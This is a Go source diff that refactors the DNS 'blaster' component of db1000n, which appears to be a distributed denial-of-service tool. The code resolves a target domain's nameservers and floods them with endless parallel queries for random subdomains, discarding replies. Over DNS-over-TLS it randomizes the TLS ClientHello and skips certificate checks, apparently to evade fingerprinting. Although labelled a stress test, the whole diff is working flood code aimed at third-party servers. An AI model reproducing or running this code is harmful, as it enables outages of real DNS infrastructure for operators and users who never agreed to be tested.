@@ -4,12 +4,14 @@ import (
 	"context"
 	"crypto/tls"
 	"fmt"
+	"math/rand"
 	"net"
 	"strconv"
 	"strings"
 	"sync"
 	"time"
 
+	"github.com/google/uuid"
 	"github.com/miekg/dns"
 	utls "github.com/refraction-networking/utls"
 	"go.uber.org/zap"
@@ -18,11 +20,7 @@ import (
 	"github.com/Arriven/db1000n/src/utils/metrics"
 )
 
-// Useful contants
 const (
-	DefaultDNSPort        = 53
-	DefaultDNSOverTLSPort = 853
-
 	UDPProtoName    = "udp"
 	TCPProtoName    = "tcp"
 	TCPTLSProtoName = "tcp-tls"
@@ -38,11 +36,8 @@ type Config struct {
 	ClientID        string
 }
 
-// DNSBlaster is a main worker struct for the package
-type DNSBlaster struct{}
-
 // Start starts the job based on provided configuration
-func Start(ctx context.Context, logger *zap.Logger, wg *sync.WaitGroup, config *Config) error {
+func Start(ctx context.Context, config *Config, wg *sync.WaitGroup, a *metrics.Accumulator, logger *zap.Logger) error {
 	defer utils.PanicHandler(logger)
 
 	logger.Debug("igniting the blaster",
@@ -62,9 +57,7 @@ func Start(ctx context.Context, logger *zap.Logger, wg *sync.WaitGroup, config *
 
 	logger.Debug("nameservers resolved for the root domain", zap.String("rootDomain", config.RootDomain), zap.Strings("nameservers", nameservers))
 
-	blaster := NewDNSBlaster()
-
-	stressTestParameters := &StressTestParameters{
+	stressTestParameters := &stressTestParameters{
 		Delay:           config.Delay,
 		Protocol:        config.Protocol,
 		SeedDomains:     config.SeedDomains,
@@ -76,78 +69,44 @@ func Start(ctx context.Context, logger *zap.Logger, wg *sync.WaitGroup, config *
 			wg.Add(1)
 		}
 
-		go func(nameserver string, parameters *StressTestParameters) {
+		go func(nameserver string, a *metrics.Accumulator) {
 			if wg != nil {
 				defer wg.Done()
 			}
 
 			defer utils.PanicHandler(logger)
 
-			if err := blaster.ExecuteStressTest(ctx, logger, nameserver, parameters, config.ClientID); err != nil {
-				metrics.IncDNSBlast(config.RootDomain, "", config.Protocol, metrics.StatusFail)
-				logger.Debug("stress test finished with error",
-					zap.String("nameserver", nameserver),
-					zap.String("proto", config.Protocol),
-					zap.Strings("seeds", config.SeedDomains),
-					zap.Duration("delay", config.Delay),
-					zap.Int("parallelQueries", config.ParallelQueries),
-					zap.Error(err))
-
-				return
-			}
-		}(nameserver, stressTestParameters)
+			executeStressTest(ctx, nameserver, stressTestParameters, config.ClientID, a, logger)
+		}(nameserver, a.Clone(uuid.NewString())) // metrics.Accumulator is not safe for concurrent use, so let's make a new one
 	}
 
 	return nil
 }
 
-// NewDNSBlaster returns properly initialized blaster instance
-func NewDNSBlaster() *DNSBlaster {
-	return &DNSBlaster{}
-}
-
-// StressTestParameters contains parameters for a single stress test
-type StressTestParameters struct {
+// stressTestParameters contains parameters for a single stress test
+type stressTestParameters struct {
 	Delay           time.Duration
 	ParallelQueries int
 	Protocol        string
 	SeedDomains     []string
 }
 
-// ExecuteStressTest executes a stress test based on parameters
-func (rcv *DNSBlaster) ExecuteStressTest(ctx context.Context, logger *zap.Logger, nameserver string, parameters *StressTestParameters, clientID string) error {
+// executeStressTest executes a stress test based on parameters
+func executeStressTest(ctx context.Context, nameserver string, parameters *stressTestParameters, clientID string, a *metrics.Accumulator, logger *zap.Logger) {
 	defer utils.PanicHandler(logger)
 
 	sharedDNSClient := newDefaultDNSClient(parameters.Protocol)
-
-	dhhGenerator, err := NewDistinctHeavyHitterGenerator(ctx, parameters.SeedDomains)
-	if err != nil {
-		metrics.IncDNSBlast(nameserver, "", parameters.Protocol, metrics.StatusFail)
-
-		return fmt.Errorf("failed to bootstrap the distinct heavy hitter generator: %w", err)
+	reusableQuery := &QueryParameters{
+		HostAndPort: nameserver,
+		QName:       "", // To be generated on each cycle
+		QType:       dns.TypeA,
 	}
-
-	defer dhhGenerator.Cancel()
 
 	nextLoopTicker := time.NewTicker(parameters.Delay)
 	defer nextLoopTicker.Stop()
 
-	var (
-		keepAliveCounter = 0
-		reusableQuery    = &QueryParameters{
-			HostAndPort: nameserver,
-			QName:       "", // To be generated on each cycle
-			QType:       dns.TypeA,
-		}
-	)
-
-	for reusableQuery.QName = range dhhGenerator.Next() {
-		const keepAliveReminder = 256
-		if keepAliveCounter++; keepAliveCounter > keepAliveReminder {
-			logger.Debug("still blasting to server", zap.String("server", reusableQuery.HostAndPort))
-
-			keepAliveCounter = 0
-		}
+	for {
+		reusableQuery.QName = randomSubdomain(parameters.SeedDomains)
 
 		var wg sync.WaitGroup
 
@@ -156,7 +115,7 @@ func (rcv *DNSBlaster) ExecuteStressTest(ctx context.Context, logger *zap.Logger
 		for i := 0; i < parameters.ParallelQueries; i++ {
 			go func() {
 				defer utils.PanicHandler(logger)
-				rcv.SimpleQueryWithNoResponse(logger, sharedDNSClient, reusableQuery, clientID)
+				simpleQueryWithNoResponse(sharedDNSClient, reusableQuery, clientID, logger)
 				wg.Done()
 			}()
 		}
@@ -167,12 +126,26 @@ func (rcv *DNSBlaster) ExecuteStressTest(ctx context.Context, logger *zap.Logger
 		case <-ctx.Done():
 			logger.Debug("DNS stress canceled", zap.String("server", reusableQuery.HostAndPort))
 
-			return nil
+			return
 		case <-nextLoopTicker.C:
 		}
 	}
+}
 
-	return nil
+//nolint:gosec // Cryptographically secure random not required
+func randomSubdomain(rootDomains []string) string {
+	const (
+		subdomainMinLength   = 3
+		subdomainMaxLength   = 64
+		randomizerDictionary = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+	)
+
+	b := make([]rune, subdomainMinLength+rand.Intn(subdomainMaxLength-subdomainMinLength))
+	for i := range b {
+		b[i] = []rune(randomizerDictionary)[rand.Intn(len(randomizerDictionary))]
+	}
+
+	return string(b) + "." + rootDomains[rand.Intn(len(rootDomains))] + "."
 }
 
 // QueryParameters contains parameters of a single dns query
@@ -189,41 +162,12 @@ type Response struct {
 	Latency time.Duration
 }
 
-// SimpleQuery performs a simple dns query based on parameters
-func (rcv *DNSBlaster) SimpleQuery(sharedDNSClient *dns.Client, parameters *QueryParameters) *Response {
-	question := new(dns.Msg).
-		SetQuestion(dns.Fqdn(parameters.QName), parameters.QType)
-
-	co, err := sharedDNSClient.Dial(parameters.HostAndPort)
-	if err != nil {
-		return &Response{
-			WithErr: err != nil,
-			Err:     err,
-		}
-	}
-
-	// Upgrade connection to use randomized ClientHello for TCP-TLS connections
-	if sharedDNSClient.Net == TCPTLSProtoName {
-		co.Conn = utls.UClient(co, &utls.Config{InsecureSkipVerify: true}, utls.HelloRandomized)
-	}
-
-	defer co.Close()
-
-	_, rtt, err := sharedDNSClient.ExchangeWithConn(question, co)
-
-	return &Response{
-		WithErr: err != nil,
-		Err:     err,
-		Latency: rtt,
-	}
-}
-
-// SimpleQueryWithNoResponse is like SimpleQuery but with optimizations enabled by not needing a response
-func (rcv *DNSBlaster) SimpleQueryWithNoResponse(logger *zap.Logger, sharedDNSClient *dns.Client, parameters *QueryParameters, clientID string) {
+// simpleQueryWithNoResponse is like SimpleQuery but with optimizations enabled by not needing a response
+func simpleQueryWithNoResponse(sharedDNSClient *dns.Client, parameters *QueryParameters, clientID string, logger *zap.Logger) {
 	question := new(dns.Msg).SetQuestion(dns.Fqdn(parameters.QName), parameters.QType)
 	seedDomain := getSeedDomain(parameters.QName)
 
-	co, err := sharedDNSClient.Dial(parameters.HostAndPort)
+	conn, err := sharedDNSClient.Dial(parameters.HostAndPort)
 	if err != nil {
 		logger.Debug("failed to dial remote host to do the DNS query", zap.String("host", parameters.HostAndPort), zap.Error(err))
 		metrics.IncDNSBlast(parameters.HostAndPort, seedDomain, sharedDNSClient.Net, metrics.StatusFail)
@@ -233,12 +177,12 @@ func (rcv *DNSBlaster) SimpleQueryWithNoResponse(logger *zap.Logger, sharedDNSCl
 
 	// Upgrade connection to use randomized ClientHello for TCP-TLS connections
 	if sharedDNSClient.Net == TCPTLSProtoName {
-		co.Conn = utls.UClient(co, &utls.Config{InsecureSkipVerify: true}, utls.HelloRandomized)
+		conn.Conn = utls.UClient(conn, &utls.Config{InsecureSkipVerify: true}, utls.HelloRandomized)
 	}
 
-	defer co.Close()
+	defer conn.Close()
 
-	_, _, err = sharedDNSClient.Exchange(question, parameters.HostAndPort)
+	_, _, err = sharedDNSClient.ExchangeWithConn(question, conn)
 	if err != nil {
 		metrics.IncDNSBlast(parameters.HostAndPort, seedDomain, sharedDNSClient.Net, metrics.StatusFail)
 		logger.Debug("failed to complete the DNS query", zap.Error(err))
@@ -249,13 +193,13 @@ func (rcv *DNSBlaster) SimpleQueryWithNoResponse(logger *zap.Logger, sharedDNSCl
 	metrics.IncDNSBlast(parameters.HostAndPort, seedDomain, sharedDNSClient.Net, metrics.StatusSuccess)
 }
 
-const (
-	dialTimeout  = 1 * time.Second        // Let's not wait long if the server cannot be dialled, we all know why
-	writeTimeout = 500 * time.Millisecond // Longer write timeout than read timeout just to make sure the query is uploaded
-	readTimeout  = 300 * time.Millisecond // Not really interested in reading responses
-)
-
 func newDefaultDNSClient(proto string) *dns.Client {
+	const (
+		dialTimeout  = 1 * time.Second        // Let's not wait long if the server cannot be dialled, we all know why
+		writeTimeout = 500 * time.Millisecond // Longer write timeout than read timeout just to make sure the query is uploaded
+		readTimeout  = 300 * time.Millisecond // Not really interested in reading responses
+	)
+
 	c := &dns.Client{
 		Dialer: &net.Dialer{
 			Timeout: dialTimeout,
@@ -276,9 +220,14 @@ func newDefaultDNSClient(proto string) *dns.Client {
 }
 
 func getNameservers(rootDomain string, protocol string) (res []string, err error) {
-	port := DefaultDNSPort
+	const (
+		defaultDNSPort        = 53
+		defaultDNSOverTLSPort = 853
+	)
+
+	port := defaultDNSPort
 	if protocol == TCPTLSProtoName {
-		port = DefaultDNSOverTLSPort
+		port = defaultDNSOverTLSPort
 	}
 
 	nameservers, err := net.LookupNS(rootDomain)
@@ -295,7 +244,6 @@ func getNameservers(rootDomain string, protocol string) (res []string, err error
 
 // getSeedDomain cut last subdomain part and root domain "." (dot). From <value>="test.example.com." returns "example.com"
 func getSeedDomain(value string) string {
-	index := strings.Index(value, ".")
 	// -1 to remove "." (dot) at end
-	return value[index+1 : len(value)-1]
+	return value[strings.Index(value, ".")+1 : len(value)-1]
 }
